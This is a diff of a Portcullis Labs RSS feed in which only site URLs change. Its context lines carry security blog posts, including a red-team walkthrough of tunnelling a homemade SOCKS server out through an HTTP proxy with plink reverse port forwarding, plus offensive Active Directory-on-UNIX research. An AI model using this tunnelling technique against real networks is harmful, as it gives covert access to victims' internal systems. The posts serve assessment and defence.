@@ -10,8 +10,8 @@
 
 <channel>
 	<title>Portcullis Labs &#187; Windows</title>
-	<atom:link href="https://labs.portcullis.co.uk/tag/windows/feed/" rel="self" type="application/rss+xml" />
-	<link>https://labs.portcullis.co.uk</link>
+	<atom:link href="https://portcullislabs.github.io/tag/windows/feed/" rel="self" type="application/rss+xml" />
+	<link>https://portcullislabs.github.io</link>
 	<description>Research and Development</description>
 	<language>en-US</language>
 		<sy:updatePeriod>hourly</sy:updatePeriod>
@@ -19,8 +19,8 @@
 	<generator>http://wordpress.org/?v=3.8.5</generator>
 	<item>
 		<title>Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</title>
-		<link>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/</link>
-		<comments>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/#comments</comments>
+		<link>https://portcullislabs.github.io/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/</link>
+		<comments>https://portcullislabs.github.io/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/#comments</comments>
 		<pubDate>Fri, 25 Jan 2019 11:36:11 +0000</pubDate>
 		<dc:creator><![CDATA[MRL]]></dc:creator>
 				<category><![CDATA[Blog]]></category>
@@ -28,8 +28,8 @@
 		<category><![CDATA[red team]]></category>
 		<category><![CDATA[Windows]]></category>
 
-		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6813</guid>
-		<description><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2). [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6813</guid>
+		<description><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2). [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
 				<content:encoded><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2).<span id="more-6813"></span></p>
 <p>I recently spent quite a long time preparing for the <a title="CREST Certified Simulated Attack Specialist" href="https://www.crest-approved.org/examination/certified-simulated-attack-specialist/index.html">CREST Certified Simulated Attack Specialist</a> exam. While I won&#8217;t be discussing exam content (which I&#8217;m under NDA for), I thought it could be beneficial to write up at least some of the interesting stuff that I prepared prior to sitting the exam.</p>
 <p>I spent a lot of time testing my tools and techniques against 5 different Anti-Virus (AV) products. I wanted to be sure that I had enough options available to me during the exam to operate efficiently, even if AV was present.  One scenario that I wanted to be prepared for was:</p>
@@ -50,10 +50,10 @@
 <li>I needed to get an SSH connection out of the network &#8211; which could probably do via the proxy using <a title="HTTP CONNECT" href="https://en.wikipedia.org/wiki/HTTP_tunnel">HTTP CONNECT</a> in the same way used for legitimate TLS connections</li>
 <li>SSH allows SSH clients to send traffic through a SOCKS proxy running on the SSH server. This was the opposite to what I needed. I needed the SSH server (on the &#8220;internet&#8221;) to be able to access a SOCKS Proxy running on the SSH Client. Which is a Windows box in this scenario. If the compromised host had been a *NIX host, I could potentially have SSH&#8217;d to localhost with the -D option to get the SOCKS server running, then made a second connection to the Internet to port-forward access to the SOCKS service</li>
 </ol>
-<div id="attachment_6823" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6814"><div class="lb-album"><a href="#image-6814"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow-300x191.png" alt="Communication Flow between Devices" class="size-medium wp-image-6823"><span></span></a></div>              
+<div id="attachment_6823" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6814"><div class="lb-album"><a href="#image-6814"><img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/protocol-flow-300x191.png" alt="Communication Flow between Devices" class="size-medium wp-image-6823"><span></span></a></div>              
 <a href="#imageclose-6814" class="css3lightbox-close">
 				   <div class="lb-overlay" id="image-6814">
-                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow.png" alt="image-6814">
+                   <img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/protocol-flow.png" alt="image-6814">
                    </div></a><p class="wp-caption-text">Communication flow between devices</p></div>
 <h2>Solving (3): SOCKS server</h2>
 <p>To solve (3) I looked for a small command line SOCKS proxy that ran on Windows. I did find some, but they all felt a bit dodgy and some said on their website that they definitely weren&#8217;t malware, despite what AV products said. Which is probably true, but it made them a poor option if I wanted to operate in the presence of AV.</p>
@@ -66,8 +66,8 @@ $ mv go-socks5 socks5
 $ cd socks5
 $ go build
 </pre>
-<p>No errors <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
-<p>But no server either. This is just a library! You need to write some code to use it. <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_sad.gif" alt=":-(" class="wp-smiley" /> </p>
+<p>No errors <img src="https://portcullislabs.github.io/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<p>But no server either. This is just a library! You need to write some code to use it. <img src="https://portcullislabs.github.io/wp-includes/images/smilies/icon_sad.gif" alt=":-(" class="wp-smiley" /> </p>
 <p>Fortunately, the author provides an example that&#8217;s easily adapted:</p>
 <pre class="brush: bash; gutter: false; title: ; notranslate">
 mkdir -p ~/go/src/mysocks5
@@ -108,10 +108,10 @@ plink -N -P 443 -i puttykey.priv.ppk -R 2080:127.0.0.1:1080 -hostkey db:b0:69:08
 <li>tunnnel@192.168.0.1 &#8211; Log into 192.168.0.1 as user tunnel</li>
 </ul>
 <p>Using the normal putty.exe GUI, I saved a session that specified all of the above detail, plus the required proxy settings (unauthenticated in the case of my lab):</p>
-<div id="attachment_6822" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6815"><div class="lb-album"><a href="#image-6815"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy-300x282.png" alt="Proxy Settings for SSH Connection in Putty" class="size-medium wp-image-6822"><span></span></a></div>              
+<div id="attachment_6822" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6815"><div class="lb-album"><a href="#image-6815"><img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/putty-proxy-300x282.png" alt="Proxy Settings for SSH Connection in Putty" class="size-medium wp-image-6822"><span></span></a></div>              
 <a href="#imageclose-6815" class="css3lightbox-close">
 				   <div class="lb-overlay" id="image-6815">
-                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy.png" alt="image-6815">
+                   <img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/putty-proxy.png" alt="image-6815">
                    </div></a><p class="wp-caption-text">Proxy settings for SSH connection in Putty</p></div>
 <p>I saved a putty session called myproxy, then retried plink:</p>
 <pre class="brush: bash; gutter: false; title: ; notranslate">
@@ -122,10 +122,10 @@ plink -load myproxy
 putty -load myproxy
 </pre>
 <p>Well, sort of fine. The victim user would have a suspicious-looking putty window pop up alongside the mysocks console window. But this is just a PoC. Let&#8217;s ignore these missing optimisations!</p>
-<div id="attachment_6830" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6816"><div class="lb-album"><a href="#image-6816"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective-300x110.png" alt="How the attack looks from user' class="size-medium wp-image-6830"><span></span></a></div>              
+<div id="attachment_6830" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6816"><div class="lb-album"><a href="#image-6816"><img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/user-prespective-300x110.png" alt="How the attack looks from user' class="size-medium wp-image-6830"><span></span></a></div>              
 <a href="#imageclose-6816" class="css3lightbox-close">
 				   <div class="lb-overlay" id="image-6816">
-                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective.png" alt="image-6816">
+                   <img src="https://portcullislabs.github.io/wp-content/uploads/2019/01/user-prespective.png" alt="image-6816">
                    </div></a><p class="wp-caption-text">How the attack looks from user&#8217;s perspective</p></div>
 <p>On the server-side, we see a network listener on port 2080.</p>
 <pre class="brush: bash; gutter: false; title: ; notranslate">
@@ -164,14 +164,14 @@ $ proxychains remmina
 <li><a title="Chisel" href="https://github.com/jpillora/chisel">Chisel</a> is a tool that can create a SOCKS-over-SSH-over-CONNECT-HTTP tunnel in the opposite direction the direction I needed</li>
 <li><a title="Crowbar" href="https://github.com/q3k/crowbar">Crowbar</a> is a tool that lets you do port forwarding over HTTP channels (no reliance on the proxy CONNECT method)</li>
 </ul>
-<p>The post <a href="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
-			<wfw:commentRss>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/feed/</wfw:commentRss>
+<p>The post <a href="https://portcullislabs.github.io/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://portcullislabs.github.io/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
 		</item>
 		<item>
 		<title>An offensive introduction to Active Directory on UNIX</title>
-		<link>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/</link>
-		<comments>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/#comments</comments>
+		<link>https://portcullislabs.github.io/blog/an-offensive-introduction-to-active-directory-on-unix/</link>
+		<comments>https://portcullislabs.github.io/blog/an-offensive-introduction-to-active-directory-on-unix/#comments</comments>
 		<pubDate>Thu, 06 Dec 2018 09:18:36 +0000</pubDate>
 		<dc:creator><![CDATA[TMB]]></dc:creator>
 				<category><![CDATA[Blog]]></category>
@@ -188,8 +188,8 @@ $ proxychains remmina
 		<category><![CDATA[UNIX]]></category>
 		<category><![CDATA[Windows]]></category>
 
-		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6805</guid>
-		<description><![CDATA[<p>By way of an introduction to our talk at Black Hat Europe, Security Advisory EMEAR would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests. Background to Active Directory integration [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6805</guid>
+		<description><![CDATA[<p>By way of an introduction to our talk at Black Hat Europe, Security Advisory EMEAR would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests. Background to Active Directory integration [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
 				<content:encoded><![CDATA[<p>By way of an introduction to <a href="https://www.blackhat.com/eu-18/briefings/schedule/index.html#where-2-worlds-collide-bringing-mimikatz-et-al-to-unix-12962" title="our talk">our talk</a> at Black Hat Europe, <a href="https://www.cisco.com/c/en/us/products/security/advisory-services.html" title="Security Advisory EMEAR">Security Advisory EMEAR</a> would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests.<span id="more-6805"></span></p>
 <h2>Background to Active Directory integration solutions</h2>
 <p>Having seen an uptick in unique UNIX infrastructures that are integrated into customers&#8217; existing Active Directory forests, the question becomes, &#8220;Does this present any concerns that may not be well understood?&#8221; This quickly became &#8220;What if an adversary could get into a UNIX box and then breach your domain?&#8221;<br />
@@ -205,14 +205,14 @@ Within a typical Active Directory integration solution (in this case <a href="ht
 <h2>Our research</h2>
 <p>Realistically, the threat models associated with each part of the implementation should be quite familiar to anyone securing a heterogeneous Windows network. Having worked with a variety of customers, it becomes apparent that the typical UNIX administrator who does not have a strong background in Windows and Active Directory will be ill-equipped to handle this threat. While we&#8217;ve been talking about successful attacks against components such as LSASS and Kerberos for quite some time, Mimikatz dates back to at least April 2014, and dumping hashes has been around even longer. Pwdump, which dumped local Windows hashes, was published by Jeremy Allison in 1997). However, no one has really taken a concerted look at whether these attacks are possible on UNIX infrastructure, nor how a blue team might spot an adversary performing them.</p>
 <p>As a result of this research, we were able to develop tactics, tools, and procedures that might further assist an attacker in breaching an enterprise, and we began documenting and developing appropriate strategies to allow blue teams to appropriately detect and respond to such incursions. The Black Hat EU slides can be found <a title="here" href="/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">here</a> and whilst the tools we developed can be found on <a href="https://github.com/portcullislabs/linikatz" title="our GitHub repo">our GitHub repo</a>.</p>
-<p>The post <a href="https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
-			<wfw:commentRss>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/feed/</wfw:commentRss>
+<p>The post <a href="https://portcullislabs.github.io/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://portcullislabs.github.io/blog/an-offensive-introduction-to-active-directory-on-unix/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
 		</item>
 		<item>
 		<title>Where 2 worlds collide: Bringing Mimikatz et al to UNIX</title>
-		<link>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/</link>
-		<comments>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/#comments</comments>
+		<link>https://portcullislabs.github.io/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/</link>
+		<comments>https://portcullislabs.github.io/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/#comments</comments>
 		<pubDate>Thu, 06 Dec 2018 08:04:06 +0000</pubDate>
 		<dc:creator><![CDATA[TMB]]></dc:creator>
 				<category><![CDATA[Presentations]]></category>
@@ -229,8 +229,8 @@ Within a typical Active Directory integration solution (in this case <a href="ht
 		<category><![CDATA[UNIX]]></category>
 		<category><![CDATA[Windows]]></category>
 
-		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6806</guid>
-		<description><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018). Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6806</guid>
+		<description><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018). Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
 				<content:encoded><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018).<span id="more-6806"></span></p>
 <p>Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may not be as well understood by a typical UNIX admin who does not have a strong background in Windows and AD. Over the last few months we&#8217;ve spent some time looking a number of specific Active Directory integration solutions (both open and closed source) for UNIX systems and documenting some of the tools, tactics and procedures that enable attacks on the forest to be staged from UNIX.</p>
 <p>This talk describes the technical details regarding our findings. It includes Proof of Concepts (PoC) showing real-world attacks against AD joined UNIX systems. Finally, potential solutions or mitigation controls are discussed that will help to either prevent those attacks or at the very least to detect them when they occur.</p>
@@ -245,9 +245,9 @@ Within a typical Active Directory integration solution (in this case <a href="ht
 </ul>
 </ul>
 <div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
-  <div class="icon"><a href="https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" title="Download Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/document.png" alt="Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX" /></a></div>
+  <div class="icon"><a href="https://portcullislabs.github.io/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" title="Download Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX"><img align="middle" src="https://portcullislabs.github.io/wp-includes/images/crystal/document.png" alt="Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX" /></a></div>
   <div class="filetitle">
-    <a href="https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" title="Download eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" id="wpfb-file-link-1">eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf</a>
+    <a href="https://portcullislabs.github.io/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" title="Download eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" id="wpfb-file-link-1">eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf</a>
     
     <br />
     December 6, 2018<br />
@@ -272,22 +272,22 @@ Within a typical Active Directory integration solution (in this case <a href="ht
   </div>
  <div style="clear: both;"></div>
 </div>
-<p>The post <a href="https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
-			<wfw:commentRss>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/feed/</wfw:commentRss>
+<p>The post <a href="https://portcullislabs.github.io/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://portcullislabs.github.io/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
 		</item>
 		<item>
 		<title>Enforcing a write-xor-execute memory policy from usermode</title>
-		<link>https://labs.portcullis.co.uk/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/</link>
-		<comments>https://labs.portcullis.co.uk/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/#comments</comments>
+		<link>https://portcullislabs.github.io/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/</link>
+		<comments>https://portcullislabs.github.io/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/#comments</comments>
 		<pubDate>Fri, 02 Feb 2018 02:21:20 +0000</pubDate>
 		<dc:creator><![CDATA[GCS]]></dc:creator>
 				<category><![CDATA[Blog]]></category>
 		<category><![CDATA[hardening]]></category>
 		<category><![CDATA[Windows]]></category>
 
-		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6399</guid>
-		<description><![CDATA[<p>If BuzzFeed ran an article titled &#8220;26 Security Features You Probably Shouldn&#8217;t Enforce From Usermode&#8221;, this one would almost certainly make the list. But, for whatever reason, I thought it would be a fun learning experience to try to enforce a W^X memory policy from usermode. Some of you are probably asking what the heck [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/">Enforcing a write-xor-execute memory policy from usermode</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6399</guid>
+		<description><![CDATA[<p>If BuzzFeed ran an article titled &#8220;26 Security Features You Probably Shouldn&#8217;t Enforce From Usermode&#8221;, this one would almost certainly make the list. But, for whatever reason, I thought it would be a fun learning experience to try to enforce a W^X memory policy from usermode. Some of you are probably asking what the heck [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/">Enforcing a write-xor-execute memory policy from usermode</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
 				<content:encoded><![CDATA[<p>If BuzzFeed ran an article titled &#8220;26 Security Features You Probably Shouldn&#8217;t Enforce From Usermode&#8221;, this one would almost certainly make the list. But, for whatever reason, I thought it would be a fun learning experience to try to enforce a W^X memory policy from usermode. Some of you are probably asking what the heck a W^X policy is in the first place, and I&#8217;m terrible at thinking of ways to start blog posts (case in point: this paragraph), so I guess we&#8217;ll start out there.<span id="more-6399"></span></p>
 <h2>What&#8217;s a W^X policy, anyway?</h2>
 <p>W^X is an exploit mitigation tactic in which memory pages that are, or have ever been, marked as writable can never be marked as executable during the process lifetime. The old exploit tactic of putting your exploit payload on the stack (or heap) and calling it directly was killed off with no-execute (NX, also known as hardware DEP on Windows) support, which made ret2libc/ROP approaches much more popular. ROP involves finding small pieces of existing executable code in the application and its libraries, chaining them together using the stack, with the goal of calling an API or two to allocate some executable memory for the payload to be copied into. On Windows this is usually done with a ROP chain to the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887.aspx" title="VirtualAlloc">VirtualAlloc</a>() API, passing <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786.aspx" title="PAGE_EXECUTE_READWRITE">PAGE_EXECUTE_READWRITE</a>() in order to allow for both writing the data in and executing it afterwards.</p>
@@ -337,14 +337,14 @@ Mhook_SetHook((PVOID*)&amp;OriginalVirtualFree,    HookedVirtualFree);
 <p>Finally there&#8217;s a really interesting case &#8211; marking a page as writable, filling it with data, freeing it, then re-allocating as read-execute and hoping that you get the same page back before it gets reset to zeroes by the OS. In fact, when I thought of this issue, I wondered whether I might have stumbled across a potential mitigation bypass in the real W^X implementation for Windows, and my eyes turned into dollar signs. Thankfully (or sadly) the clever folks at Microsoft thought of this already, and forced every released page to be reset.</p>
 <h2>Closing words</h2>
 <p>I hope that this ham-fisted approach to implementing W^X has been of some educational use, at least in terms of thinking about how the protection can be implemented in practice. If you&#8217;d like to follow along at home, the code can be found in the <a title="WXPolicyEnforcer" href="https://github.com/portcullislabs/WXPolicyEnforcer">WXPolicyEnforcer</a> project on the Portcullis Labs GitHub. It is released under MIT license.</p>
-<p>The post <a href="https://labs.portcullis.co.uk/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/">Enforcing a write-xor-execute memory policy from usermode</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
-			<wfw:commentRss>https://labs.portcullis.co.uk/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/feed/</wfw:commentRss>
+<p>The post <a href="https://portcullislabs.github.io/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/">Enforcing a write-xor-execute memory policy from usermode</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://portcullislabs.github.io/blog/enforcing-a-write-xor-execute-memory-policy-from-usermode/feed/</wfw:commentRss>
 		<slash:comments>0</slash:comments>
 		</item>
 		<item>
 		<title>Windows 10’s &#8220;Controlled Folder Access&#8221; feature</title>
-		<link>https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/</link>
-		<comments>https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/#comments</comments>
+		<link>https://portcullislabs.github.io/blog/windows-10s-controlled-folder-access-feature/</link>
+		<comments>https://portcullislabs.github.io/blog/windows-10s-controlled-folder-access-feature/#comments</comments>
 		<pubDate>Thu, 16 Nov 2017 09:44:52 +0000</pubDate>
 		<dc:creator><![CDATA[RGH]]></dc:creator>
 				<category><![CDATA[Blog]]></category>
@@ -354,8 +354,8 @@ Mhook_SetHook((PVOID*)&amp;OriginalVirtualFree,    HookedVirtualFree);
 		<category><![CDATA[training]]></category>
 		<category><![CDATA[Windows]]></category>
 
-		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6110</guid>
-		<description><![CDATA[<p>Microsoft released a rolling upgrade of Windows 10 in October 2017. The &#8220;Fall Creators&#8221; edition (version 1709, codename Redstone 3) contains a new feature called &#8220;Controlled Folder Access&#8221;, which is designed to combat ransomware attacks. Controlled Folder Access is part of Windows Defender Security Centre that works with Windows Defender Anti-Virus to prevent &#8220;suspicious&#8221; executable [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/windows-10s-controlled-folder-access-feature/">Windows 10’s &#8220;Controlled Folder Access&#8221; feature</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6110</guid>
+		<description><![CDATA[<p>Microsoft released a rolling upgrade of Windows 10 in October 2017. The &#8220;Fall Creators&#8221; edition (version 1709, codename Redstone 3) contains a new feature called &#8220;Controlled Folder Access&#8221;, which is designed to combat ransomware attacks. Controlled Folder Access is part of Windows Defender Security Centre that works with Windows Defender Anti-Virus to prevent &#8220;suspicious&#8221; executable [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/windows-10s-controlled-folder-access-feature/">Windows 10’s &#8220;Controlled Folder Access&#8221; feature</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
 				<content:encoded><![CDATA[<p>Microsoft released a rolling upgrade of Windows 10 in October 2017. The &#8220;Fall Creators&#8221; edition (version 1709, codename Redstone 3) contains a new feature called &#8220;Controlled Folder Access&#8221;, which is designed to combat ransomware attacks.<span id="more-6110"></span></p>
 <p>Controlled Folder Access is part of Windows Defender Security Centre that works with Windows Defender Anti-Virus to prevent &#8220;suspicious&#8221; executable files, DLLs, and scripts from writing to (or encrypting) files within certain folders.</p>
 <h2>What folders are protected?</h2>
@@ -421,10 +421,10 @@ Key Value: 0&lt;/code&gt;
 <li>Event ID: 1123: Blocked Controlled folder access event</li>
 </ul>
 <p>The following image shows the notification of a write action being blocked:</p>
-<p><a name="imageclose-6111"><div class="lb-album"><a href="#image-6111"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2017/11/VirtualBox_Win10_Ent_90days_02_11_2017_14_17_19-300x225.png" alt="Blocked write access notification" class="size-medium wp-image-6121"><span></span></a></div>              
+<p><a name="imageclose-6111"><div class="lb-album"><a href="#image-6111"><img src="https://portcullislabs.github.io/wp-content/uploads/2017/11/VirtualBox_Win10_Ent_90days_02_11_2017_14_17_19-300x225.png" alt="Blocked write access notification" class="size-medium wp-image-6121"><span></span></a></div>              
 <a href="#imageclose-6111" class="css3lightbox-close">
 				   <div class="lb-overlay" id="image-6111">
-                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2017/11/VirtualBox_Win10_Ent_90days_02_11_2017_14_17_19.png" alt="image-6111">
+                   <img src="https://portcullislabs.github.io/wp-content/uploads/2017/11/VirtualBox_Win10_Ent_90days_02_11_2017_14_17_19.png" alt="image-6111">
                    </div></a></p>
 <h3>Can the blocked write notification message be customised?</h3>
